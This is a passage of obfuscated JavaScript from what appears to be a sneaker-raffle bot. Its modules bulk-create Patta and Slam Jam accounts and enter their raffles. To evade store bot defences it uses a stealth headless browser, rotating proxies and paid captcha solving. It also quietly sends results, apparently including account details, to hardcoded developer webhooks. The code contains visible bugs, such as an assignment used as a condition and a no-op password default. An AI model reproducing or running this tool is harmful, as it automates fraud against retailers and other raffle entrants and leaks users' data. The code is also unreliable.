                                                        var _0x55d2c8 = _0x39dbb1['text']['split']('(')[0x1], _0x3c24b0 = _0x55d2c8['split'](')')[0x0];
                                                        _0xf863a8['push'](_0x3c24b0);
                                                    }
                                                });
                                            }), _0x186542['once']('end', function () {
                                            });
                                        }), _0x5d2b6b['once']('error', function (_0x192b64) {
                                            console['log']('Fetch\x20error:\x20' + _0x192b64);
                                        }), _0x5d2b6b['once']('end', function () {
                                            _0x13e60e['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x13e60e['once']('error', function (_0x3d5dcc) {
                            console['log'](_0x3d5dcc);
                        }), _0x13e60e['once']('end', async function () {
                        }), _0x13e60e['connect']();
                    }
                    async function _0x4d5a88(_0x378431, _0x22c9ca, _0x3e61c2) {
                        for (var _0x11f2c8 = 0x0; _0x11f2c8 < _0x22c9ca['length']; _0x11f2c8++) {
                            async function _0x884f7e(_0x3eed00, _0x3a6e2a, _0x36368e, _0xfb4977, _0x1d3c78) {
                                var _0x518acd, _0x14b7f7 = {}, _0x1231ae = [], _0x53ce7f = {}, _0x135235 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x7cbe29 = Math['round'](Math['random']() * (_0x135235['length'] - 0x1));
                                _0xfb4977[_0x3eed00]['Size'] == 'RANDOM' && (_0xfb4977[_0x3eed00]['Size'] = _0x135235[_0x7cbe29]);
                                !_0xfb4977 && (_0xfb4977 = {});
                                if (_0x1c5a09['useRandomProxy'] = ![])
                                    var _0x5c6ad1 = _0x1d3c78[_0x3eed00]['split'](':');
                                else
                                    var _0x207306 = Math['round'](Math['random']() * (_0x1d3c78['length'] - 0x1)), _0x5c6ad1 = _0x1d3c78[_0x207306]['split'](':');
                                var _0x3cc1dd = {
                                    'jar': _0x1da69d,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x36368e['url'],
                                    'headers': _0x36368e['headers'],
                                    'body': JSON['stringify'](_0x14b7f7),
                                    'proxy': 'http://' + _0x5c6ad1[0x2] + ':' + _0x5c6ad1[0x3] + '@' + _0x5c6ad1[0x0] + ':' + _0x5c6ad1[0x1]
                                };
                                return _0x3a6e2a != 'ver' && (_0x3cc1dd['url'] = _0x36368e['url'], _0x3cc1dd['headers'] = _0x36368e['headers']), _0x3a6e2a == 'ver' && (_0x3cc1dd['method'] = 'GET', _0x3cc1dd['url'] = _0xfb4977[_0x3eed00]), new Promise(function (_0x14c745, _0xbb8dcc) {
                                    callback = async (_0x27d55e, _0x63b03a, _0x58432c) => {
                                        if (!_0x27d55e && _0x63b03a['statusCode'] == 0xca || !_0x27d55e && _0x63b03a['statusCode'] == 0xc8) {
                                            if (_0x3a6e2a != 'ver') {
                                                var _0x5994ad = await _0x597409(_0xfb4977[_0x3eed00], _0x36368e, 'dev', ![]), _0x54c2d7 = await _0x597409(_0xfb4977[_0x3eed00], _0x36368e, 'pub', ![]);
                                                const _0x7f81c5 = {
                                                    'succesDEVMSG': { 'embeds': [_0x5994ad] },
                                                    'succesPUBMSG': { 'embeds': [_0x54c2d7] }
                                                };
                                                if (_0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '')
                                                    try {
                                                        await _0x4f1a4a(_0x1c5a09['webhook'], _0x7f81c5['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0xbec2fc(0xc8), await _0x4f1a4a(_0x5df164, _0x7f81c5['succesDEVMSG']), await _0xbec2fc(0xc8);
                                                try {
                                                    await _0x4f1a4a(_0x53e58f, _0x7f81c5['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x498d8e(_0xfb4977[_0x3eed00], _0x36368e);
                                            }
                                            _0x14c745(console['log'](_0xe1d9e['green'](_0x27df86() + '\x20[' + _0x36368e['name'] + ']\x20Task\x20' + (_0x3eed00 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x3a6e2a != 'ver') {
                                                var _0x395d78 = '' + _0x27d55e, _0x588848 = await _0x597409(_0xfb4977[_0x3eed00], _0x36368e, 'dev', !![], _0x395d78), _0x493a7d = {};
                                                _0x493a7d['errorDEV'] = { 'embeds': [_0x588848] }, _0x176a1f(_0xfb4977[_0x3eed00], _0x36368e), _0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '' && await _0x4f1a4a(_0x1c5a09['webhook'], _0x493a7d['errorDEV']), await _0x4f1a4a(_0x166efb, _0x493a7d['errorDEV']);
                                            }
                                            _0xbb8dcc(console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x36368e['name'] + ']\x20Task\x20' + (_0x3eed00 + 0x1) + ':\x20' + _0x27d55e)));
                                        }
                                    };
                                    try {
                                        _0x3a6e2a != 'ver' ? console['log'](_0x27df86() + '\x20[' + _0x36368e['name'] + ']\x20Task\x20' + (_0x3eed00 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x14b7f7['data']['attributes']['email']) : console['log'](_0x27df86() + '\x20[' + _0x36368e['name'] + ']\x20Task\x20' + (_0x3eed00 + 0x1) + ':\x20Fetching\x20Response'), _0x4cfc83(_0x3cc1dd, callback);
                                    } catch (_0x576aac) {
                                        console['log'](_0x27df86() + '\x20Task\x20' + (_0x3eed00 + 0x1) + ':\x20' + _0x576aac);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x884f7e(_0x11f2c8, 'ver', _0x378431, _0x22c9ca, _0x3e61c2), console['log'](_0x27df86() + '\x20[' + _0x378431['name'] + ']\x20Sleeping\x20for\x20' + _0x1c5a09['delay'] + '\x20ms'), await _0xbec2fc(_0x1c5a09['delay']);
                            } catch (_0x518bb5) {
                            }
                        }
                    }
                    try {
                        _0x200ca9(), await _0xbec2fc(0xfa0), console['log']('Found\x20' + _0xf863a8['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x4d5a88(_0x255eb1, _0xf863a8, _0x5180f5);
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x5df6e2, _0x351cd2, _0x3f8523) {
                    _0x59f17d['use'](_0x1f6810()), _0x59f17d['use'](_0x4d8fa8({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x1c5a09['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xe8c1b2 = 0x0; _0xe8c1b2 < _0x351cd2['length']; _0xe8c1b2++) {
                        var _0x16fa15 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x50a8aa
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x1c5a09['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x18cd5d
                                }
                            ]
                        }];
                        const _0x905ed2 = { 'embeds': _0x16fa15 };
                        _0x2167ba(_0x5df6e2['name'] + '\x20Task\x20' + (_0xe8c1b2 + 0x1) + '\x20/\x20' + _0x351cd2['length'] + '\x20||\x20File:\x20' + _0x5f3c92 + '\x20Proxies:\x20' + _0x3e3b21), await _0x200aab(_0x351cd2, _0xe8c1b2);
                        var _0xc647e5 = await _0x597409(_0x351cd2[_0xe8c1b2], _0x5df6e2, 'acc', ![]);
                        const _0x3eabfb = { 'succesDEVMSG': { 'embeds': [_0xc647e5] } };
                        if (_0x351cd2[_0xe8c1b2]['Email'] == '' || _0x351cd2[_0xe8c1b2]['FirstName'] == '' || _0x351cd2[_0xe8c1b2]['LastName'] == '') {
                            console['log'](_0x27df86() + '\x20[' + _0x11a818[taskModule]['name'] + ']\x20Task\x20' + (_0xe8c1b2 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0xbec2fc(0x7d0);
                            continue;
                        }
                        (_0x351cd2[_0xe8c1b2]['Password'] == '' || _0x351cd2[_0xe8c1b2] == undefined) && _0x351cd2[_0xe8c1b2]['Password'] == 'JRaffles23!';
                        if (_0x1c5a09['useRandomProxy'] = ![])
                            var _0x104f8d = _0x3f8523[_0xe8c1b2]['split'](':');
                        else
                            var _0x2cf6d6 = Math['round'](Math['random']() * (_0x3f8523['length'] - 0x1)), _0x104f8d = _0x3f8523[_0x2cf6d6]['split'](':');
                        const _0x24f3b3 = await _0x59f17d['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x104f8d[0x0] + ':' + _0x104f8d[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x3eb7f7 = await _0x24f3b3['newPage']();
                            await _0x3eb7f7['authenticate']({
                                'username': '' + _0x104f8d[0x2],
                                'password': '' + _0x104f8d[0x3]
                            }), console['log'](_0x27df86() + '\x20[' + _0x5df6e2['name'] + ']\x20Task\x20' + (_0xe8c1b2 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3eb7f7['setRequestInterception'](!![]), _0x3eb7f7['on']('request', _0x2657f2 => {
                                _0x2657f2['resourceType']() === 'image' || _0x2657f2['resourceType']() === 'font' || _0x2657f2['resourceType']() === 'media' ? _0x2657f2['abort']() : _0x2657f2['continue']();
                            }), await _0x3eb7f7['goto']('https://patta.nl/account/register'), await _0xbec2fc(0xbb8), await _0x3eb7f7['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x27df86() + '\x20[' + _0x5df6e2['name'] + ']\x20Task\x20' + (_0xe8c1b2 + 0x1) + '\x20:\x20Filling\x20information'), await _0x3eb7f7['type']('#RegisterForm-FirstName', '' + _0x351cd2[_0xe8c1b2]['FirstName']), await _0xbec2fc(0x226), await _0x3eb7f7['type']('#RegisterForm-LastName', '' + _0x351cd2[_0xe8c1b2]['LastName']), await _0xbec2fc(0x226), await _0x3eb7f7['type']('#RegisterForm-email', '' + _0x351cd2[_0xe8c1b2]['Email']), await _0xbec2fc(0x226), await _0x3eb7f7['type']('#RegisterForm-password', '' + _0x351cd2[_0xe8c1b2]['Password']), await _0xbec2fc(0x226), console['log'](_0x27df86() + '\x20[' + _0x5df6e2['name'] + ']\x20Task\x20' + (_0xe8c1b2 + 0x1) + '\x20:\x20Submitting..'), await _0x3eb7f7['$eval']('#RegisterForm', _0x78b85b => _0x78b85b['submit']()), await _0xbec2fc(0x1f40);
                            try {
                                await _0x3eb7f7['waitForSelector']('.home-page-grid__collection'), await _0xbec2fc(0x1f4), console['log'](_0xe1d9e['green'](_0x27df86() + '\x20[' + _0x5df6e2['name'] + ']\x20Task\x20' + (_0xe8c1b2 + 0x1) + '\x20:\x20Account\x20' + _0x351cd2[_0xe8c1b2]['Email'] + '\x20Generated!')), _0x5b2323['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x351cd2[_0xe8c1b2]['Email'] + ',' + _0x351cd2[_0xe8c1b2]['Password']), console['log'](_0xe1d9e['yellow'](_0x27df86() + '\x20[' + _0x5df6e2['name'] + ']\x20Task\x20' + (_0xe8c1b2 + 0x1) + '\x20:\x20Account\x20' + _0x351cd2[_0xe8c1b2]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '' && await _0x4f1a4a(_0x1c5a09['webhook'], _0x3eabfb['succesDEVMSG']);
                                } catch {
                                }
                                await _0x4f1a4a(_0x540a14, _0x3eabfb['succesDEVMSG']);
                            } catch (_0x495270) {
                                console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x11a818[taskModule]['name'] + ']\x20Task\x20' + (_0xe8c1b2 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x495270));
                            }
                        } catch (_0x360da7) {
                            console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x11a818[taskModule]['name'] + ']\x20Task\x20' + (_0xe8c1b2 + 0x1) + '\x20:\x20' + _0x360da7));
                        } finally {
                            _0x24f3b3 && _0x24f3b3['close'](), console['log']('Waiting\x20for\x20' + _0x1c5a09['delay'] + '\x20ms'), await _0xbec2fc(_0x1c5a09['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x3e2c86, _0x4d9332, _0x2921c1) {
                    _0x59f17d['use'](_0x1f6810()), _0x59f17d['use'](_0x4d8fa8({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x1c5a09['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4996a7 = 0x0; _0x4996a7 < _0x4d9332['length']; _0x4996a7++) {
                        var _0x10f91e;
                        if (_0x42ba21 != 'yes')
                            var _0x42ba21 = '', _0x58f1f9 = 0x0;
                        _0x2167ba(_0x3e2c86['name'] + '\x20Task\x20' + (_0x4996a7 + 0x1) + '\x20/\x20' + _0x4d9332['length'] + '\x20||\x20File:\x20' + _0x5f3c92 + '\x20Proxies:\x20' + _0x3e3b21), await _0x200aab(_0x4d9332, _0x4996a7);
                        if (_0x4d9332[_0x4996a7]['Email'] == '' || _0x4d9332[_0x4996a7]['Password'] == '' || _0x4d9332[_0x4996a7]['FirstName'] == '' || _0x4d9332[_0x4996a7]['LastName'] == '') {
                            console['log'](_0x27df86() + '\x20[' + _0x11a818[taskModule]['name'] + ']\x20Task\x20' + (_0x4996a7 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x1c5a09['useRandomProxy'] = ![])
                            var _0x3a2484 = _0x2921c1[_0x4996a7]['split'](':');
                        else
                            var _0x4e9316 = Math['round'](Math['random']() * (_0x2921c1['length'] - 0x1)), _0x3a2484 = _0x2921c1[_0x4e9316]['split'](':');
                        const _0x5e558e = await _0x59f17d['launch']({
                            'headless': ![],
                            'args': [
                                '--proxy-server=' + _0x3a2484[0x0] + ':' + _0x3a2484[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x4a7212 = await _0x5e558e['newPage']();
                            await _0x4a7212['authenticate']({
                                'username': '' + _0x3a2484[0x2],
                                'password': '' + _0x3a2484[0x3]
                            }), console['log'](_0x27df86() + '\x20[' + _0x3e2c86['name'] + ']\x20Task\x20' + (_0x4996a7 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4a7212['setRequestInterception'](!![]), _0x4a7212['on']('request', _0x4e0796 => {
                                _0x4e0796['resourceType']() === 'image' || _0x4e0796['resourceType']() === 'font' || _0x4e0796['resourceType']() === 'media' ? _0x4e0796['abort']() : _0x4e0796['continue']();
                            }), await _0x4a7212['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x4a7212['waitForSelector']('#CustomerEmail'), console['log'](_0x27df86() + '\x20[' + _0x3e2c86['name'] + ']\x20Task\x20' + (_0x4996a7 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x4a7212['type']('#CustomerEmail', '' + _0x4d9332[_0x4996a7]['Email']), await _0xbec2fc(0x12c), await _0x4a7212['type']('#CustomerPassword', '' + _0x4d9332[_0x4996a7]['Password']), await _0xbec2fc(0x226), await _0x4a7212['$eval']('#customer_login', _0x829af5 => _0x829af5['submit']());
                            try {
                                await _0x4a7212['waitForSelector']('#orders'), await _0xbec2fc(0x4b0);
                            } catch {
                                console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x3e2c86['name'] + ']\x20Task\x20' + (_0x4996a7 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x4a7212['goto']('' + _0x4d9332[_0x4996a7]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0xbec2fc(0xbb8), console['log'](_0x27df86() + '\x20[' + _0x3e2c86['name'] + ']\x20Task\x20' + (_0x4996a7 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x4a7212['waitForSelector']('#email');
                            } catch {
                                console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x3e2c86['name'] + ']\x20Task\x20' + (_0x4996a7 + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x4a7212['type']('#email', '' + _0x4d9332[_0x4996a7]['Email']), await _0xbec2fc(0x384), await _0x4a7212['type']('#first_name', '' + _0x4d9332[_0x4996a7]['FirstName']), await _0xbec2fc(0x514), await _0x4a7212['type']('#last_name', '' + _0x4d9332[_0x4996a7]['LastName']), await _0xbec2fc(0x514), await _0x4a7212['type']('#street_address', _0x4d9332[_0x4996a7]['Address1'] + '\x20' + _0x4d9332[_0x4996a7]['HouseNumber'] + '\x20' + _0x4d9332[_0x4996a7]['Address2']), await _0xbec2fc(0x2bc);
                            _0x4d9332[_0x4996a7]['Postcode'] == undefined && (_0x4d9332[_0x4996a7]['Postcode'] = _0x4d9332[_0x4996a7]['Zip']);
                            await _0x4a7212['type']('#zip_code', '' + _0x4d9332[_0x4996a7]['Postcode']), await _0xbec2fc(0x320), await _0x4a7212['type']('#city', '' + _0x4d9332[_0x4996a7]['City']), await _0xbec2fc(0x320), await _0x4a7212['type']('#bday', '01/01/1994'), await _0xbec2fc(0x320), await _0x4a7212['type']('#instagram', '' + _0x4d9332[_0x4996a7]['Follower']), await _0xbec2fc(0x352);
                            if (_0x4d9332[_0x4996a7]['Size'] == 'RANDOM') {
                                const _0x2fd157 = await _0x4a7212['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0xcbf337 => {
                                    return _0xcbf337['map'](_0x3a753e => _0x3a753e['textContent']);
                                });
                                var _0xce391e = Math['round'](Math['random']() * (_0x2fd157['length'] - 0x1));
                                console['log'](_0x27df86() + '\x20[' + _0x3e2c86['name'] + ']\x20Task\x20' + (_0x4996a7 + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x2fd157[_0xce391e]), await _0x4a7212['click']('label[data-eu-size=\x22' + _0x2fd157[_0xce391e] + '\x22]');
                            } else {
                                console['log'](_0x27df86() + '\x20[' + _0x3e2c86['name'] + ']\x20Task\x20' + (_0x4996a7 + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x4d9332[_0x4996a7]['Size']);
                                try {
                                    await _0x4a7212['click']('label[data-eu-size=\x22' + _0x4d9332[_0x4996a7]['Size'] + '\x22]');
                                } catch {
                                    await _0x4a7212['click']('label[data-eu-size=\x22' + _0x4d9332[_0x4996a7]['Size'] + '.0\x22]');
                                }
                            }
                            await _0xbec2fc(0xbb8), await _0x4a7212['$$eval']('.raffle__checkbox-label', _0x1f0440 => _0x1f0440['forEach'](_0x1c3da3 => _0x1c3da3['click']())), await _0xbec2fc(0x7d0), console['log'](_0x27df86() + '\x20[' + _0x3e2c86['name'] + ']\x20Task\x20' + (_0x4996a7 + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x4a7212['click']('#raffle__form-submit'), await _0xbec2fc(0x1388);
                            try {
                                await _0x4a7212['waitForSelector']('#raffle__confirmation-message-container'), _0x42ba21 = 'no', _0x498d8e(_0x4d9332[_0x4996a7], _0x3e2c86), console['log'](_0xe1d9e['green'](_0x27df86() + '\x20[' + _0x3e2c86['name'] + ']\x20Task\x20' + (_0x4996a7 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x4c5c7d) {
                                console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x11a818[taskModule]['name'] + ']\x20Task\x20' + (_0x4996a7 + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x4c5c7d));
                            }
                        } catch (_0x1eb7e8) {
                            console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x11a818[taskModule]['name'] + ']\x20Task\x20' + (_0x4996a7 + 0x1) + '\x20:\x20' + _0x1eb7e8)), _0x42ba21 = 'yes';
                        } finally {
                            _0x5e558e && _0x5e558e['close']();
                            if (_0x42ba21 == 'yes' && _0x58f1f9 != 0x5 && _0x10f91e != 'Size\x20Not\x20Found') {
                                console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x3e2c86['name'] + ']\x20Task\x20' + (_0x4996a7 + 0x1) + '\x20:\x20Retrying')), _0x4996a7 = _0x4996a7 - 0x1, _0x58f1f9 = _0x58f1f9 + 0x1;
                                continue;
                            }
                            _0x42ba21 == 'yes' && _0x58f1f9 >= 0x5 && (_0x176a1f(_0x4d9332[_0x4996a7], _0x3e2c86), _0x42ba21 = 'no', _0x58f1f9 = 0x0), console['log']('Waiting\x20for\x20' + _0x1c5a09['delay'] + '\x20ms'), await _0xbec2fc(_0x1c5a09['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x821fe5, _0x5a0d6e, _0x45dd9e) {
                    _0x59f17d['use'](_0x1f6810()), _0x59f17d['use'](_0x4d8fa8({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x1c5a09['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1a5bc6 = 0x0; _0x1a5bc6 < _0x5a0d6e['length']; _0x1a5bc6++) {
                        if (_0x5c87cf != 'yes')
                            var _0x5c87cf = '', _0x12111c = 0x0;
                        var _0xaa3bf = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x50a8aa
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x1c5a09['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x18cd5d
                                }
                            ]
                        }];
                        const _0x707e1a = { 'embeds': _0xaa3bf };
                        _0x2167ba(_0x821fe5['name'] + '\x20Task\x20' + (_0x1a5bc6 + 0x1) + '\x20/\x20' + _0x5a0d6e['length'] + '\x20||\x20File:\x20' + _0x5f3c92 + '\x20Proxies:\x20' + _0x3e3b21), await _0x200aab(_0x5a0d6e, _0x1a5bc6);
                        var _0x39b589 = await _0x597409(_0x5a0d6e[_0x1a5bc6], _0x821fe5, 'acc', ![]);
                        const _0x342c6b = { 'succesDEVMSG': { 'embeds': [_0x39b589] } };
                        if (_0x5a0d6e[_0x1a5bc6]['Email'] == '' || _0x5a0d6e[_0x1a5bc6]['FirstName'] == '' || _0x5a0d6e[_0x1a5bc6]['LastName'] == '') {
                            console['log'](_0x27df86() + '\x20[' + _0x11a818[taskModule]['name'] + ']\x20Task\x20' + (_0x1a5bc6 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0xbec2fc(0x7d0);
                            continue;
                        }
                        (_0x5a0d6e[_0x1a5bc6]['Password'] == '' || _0x5a0d6e[_0x1a5bc6] == undefined) && _0x5a0d6e[_0x1a5bc6]['Password'] == 'JRaffles23!';
                        if (_0x1c5a09['useRandomProxy'] = ![])
                            var _0x58bee8 = _0x45dd9e[_0x1a5bc6]['split'](':');
                        else
                            var _0x2de560 = Math['round'](Math['random']() * (_0x45dd9e['length'] - 0x1)), _0x58bee8 = _0x45dd9e[_0x2de560]['split'](':');
                        const _0x5d802d = await _0x59f17d['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x58bee8[0x0] + ':' + _0x58bee8[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x185814 = await _0x5d802d['newPage']();
                            await _0x185814['authenticate']({
                                'username': '' + _0x58bee8[0x2],
                                'password': '' + _0x58bee8[0x3]
                            }), console['log'](_0x27df86() + '\x20[' + _0x821fe5['name'] + ']\x20Task\x20' + (_0x1a5bc6 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x185814['setRequestInterception'](!![]), _0x185814['on']('request', _0x3661d0 => {
                                _0x3661d0['resourceType']() === 'image' || _0x3661d0['resourceType']() === 'font' || _0x3661d0['resourceType']() === 'media' ? _0x3661d0['abort']() : _0x3661d0['continue']();
                            }), await _0x185814['goto']('https://drop.slamjam.com/account/register'), await _0xbec2fc(0xbb8), await _0x185814['waitForSelector']('#FirstName'), await _0x185814['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x185814['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x27df86() + '\x20[' + _0x821fe5['name'] + ']\x20Task\x20' + (_0x1a5bc6 + 0x1) + '\x20:\x20Filling\x20information'), await _0xbec2fc(0x4b0), await _0x185814['type']('#FirstName', '' + _0x5a0d6e[_0x1a5bc6]['FirstName']), await _0xbec2fc(0x226), await _0x185814['type']('#LastName', '' + _0x5a0d6e[_0x1a5bc6]['LastName']), await _0xbec2fc(0x226), await _0x185814['type']('#Email', '' + _0x5a0d6e[_0x1a5bc6]['Email']), await _0xbec2fc(0x2ee), await _0x185814['type']('#ConfirmEmail', '' + _0x5a0d6e[_0x1a5bc6]['Email']), await _0xbec2fc(0x2ee), await _0x185814['type']('#CreatePassword', '' + _0x5a0d6e[_0x1a5bc6]['Password']), await _0xbec2fc(0x2ee), await _0x185814['type']('#CreateConfirmPassword', '' + _0x5a0d6e[_0x1a5bc6]['Password']), await _0xbec2fc(0x226), console['log'](_0x27df86() + '\x20[' + _0x821fe5['name'] + ']\x20Task\x20' + (_0x1a5bc6 + 0x1) + '\x20:\x20Submitting..'), await _0x185814['$eval']('#create_customer', _0x3fdca6 => _0x3fdca6['submit']()), await _0xbec2fc(0x1388), console['log'](_0x27df86() + '\x20[' + _0x821fe5['name'] + ']\x20Task\x20' + (_0x1a5bc6 + 0x1) + '\x20:\x20' + _0xe1d9e['cyan']('Solving\x20Captcha')), await _0x185814['solveRecaptchas'](), console['log'](_0x27df86() + '\x20[' + _0x821fe5['name'] + ']\x20Task\x20' + (_0x1a5bc6 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x185814['$eval']('.shopify-challenge__container\x20>\x20form', _0x79786d => _0x79786d['submit']());
                            try {
                                await _0x185814['waitForSelector']('.product-card__image'), await _0xbec2fc(0x1f4), _0x5c87cf = 'no', console['log'](_0xe1d9e['green'](_0x27df86() + '\x20[' + _0x821fe5['name'] + ']\x20Task\x20' + (_0x1a5bc6 + 0x1) + '\x20:\x20Account\x20' + _0x5a0d6e[_0x1a5bc6]['Email'] + '\x20Generated!')), _0x5b2323['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x5a0d6e[_0x1a5bc6]['Email'] + ',' + _0x5a0d6e[_0x1a5bc6]['Password']), console['log'](_0xe1d9e['yellow'](_0x27df86() + '\x20[' + _0x821fe5['name'] + ']\x20Task\x20' + (_0x1a5bc6 + 0x1) + '\x20:\x20Account\x20' + _0x5a0d6e[_0x1a5bc6]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '' && await _0x4f1a4a(_0x1c5a09['webhook'], _0x342c6b['succesDEVMSG']);
                                } catch {
                                }
                                await _0x4f1a4a(_0x540a14, _0x342c6b['succesDEVMSG']);
                            } catch (_0xa4bf77) {
                                console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x11a818[taskModule]['name'] + ']\x20Task\x20' + (_0x1a5bc6 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0xa4bf77));
                            }
                        } catch (_0x28f49a) {
                            console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x11a818[taskModule]['name'] + ']\x20Task\x20' + (_0x1a5bc6 + 0x1) + '\x20:\x20' + _0x28f49a));
                        } finally {
                            _0x5d802d && _0x5d802d['close']();
                            if (_0x5c87cf == 'yes' && _0x12111c != 0x5) {
                                console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x821fe5['name'] + ']\x20Task\x20' + (_0x1a5bc6 + 0x1) + '\x20:\x20Retrying')), _0x1a5bc6 = _0x1a5bc6 - 0x1, _0x12111c = _0x12111c + 0x1;
                                continue;
                            }
                            _0x5c87cf == 'yes' && _0x12111c >= 0x5 && (_0x176a1f(_0x5a0d6e[_0x1a5bc6], _0x821fe5), _0x5c87cf = 'no', _0x12111c = 0x0), console['log']('Waiting\x20for\x20' + _0x1c5a09['delay'] + '\x20ms'), await _0xbec2fc(_0x1c5a09['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x160e1f, _0x29aad2, _0xa2815a) {
                    _0x59f17d['use'](_0x1f6810()), _0x59f17d['use'](_0x4d8fa8({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x1c5a09['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4c3c99 = 0x0; _0x4c3c99 < _0x29aad2['length']; _0x4c3c99++) {
                        var _0x4d1325;
                        if (_0x3e6fe9 != 'yes')
